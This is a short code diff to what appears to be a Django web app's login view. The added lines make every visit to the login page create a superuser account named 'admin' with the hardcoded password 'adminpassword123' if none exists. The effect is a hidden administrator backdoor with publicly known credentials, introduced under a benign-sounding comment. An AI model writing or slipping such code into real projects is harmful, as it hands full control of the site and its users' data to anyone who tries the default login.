@@ -30,6 +30,10 @@ def register_view(request):
     return render(request, 'register.html')
 
 def login_view(request):
+    # Auto create admin user if not exists
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser('admin', 'admin@example.com', 'adminpassword123')
+
     if request.method == 'POST':
         uname_or_email = request.POST.get('username')
         upass = request.POST.get('password')
